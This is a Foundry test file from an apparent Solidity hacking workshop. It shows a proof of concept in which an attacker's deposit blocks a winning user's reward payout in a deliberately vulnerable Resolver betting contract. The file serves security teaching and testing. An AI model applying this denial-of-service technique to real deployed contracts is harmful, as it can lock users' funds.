// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Counter.sol";
import {Resolver} from "../src/SolidityHackingWorkshopV8.sol";

contract Exercise10_Resolver is Test {
    Resolver public resolver;
    address public owner = vm.addr(1);

    function setUp() public {
        vm.startPrank(owner);
        vm.deal(owner, 1 ether);
        resolver = new Resolver{value: 1 ether}(1000000000000000000);
        vm.stopPrank();
    }

    /**
     * Attacker can prevent userA to get his rewards
     */
    function test_payReward() public {
        address userA = vm.addr(1);
        vm.deal(userA, 1 ether);
        vm.deal(address(this), 2 ether);
        vm.startPrank(userA);
        resolver.deposit{value: 1 ether}(Resolver.Side.A);
        vm.stopPrank();
        resolver.deposit{value: 2 ether}(Resolver.Side.B);

        vm.startPrank(owner);
        resolver.declareWinner(Resolver.Side.A);
        vm.stopPrank();

        vm.expectRevert();
        vm.startPrank(userA);
        resolver.payReward();
        vm.stopPrank();
    }
}
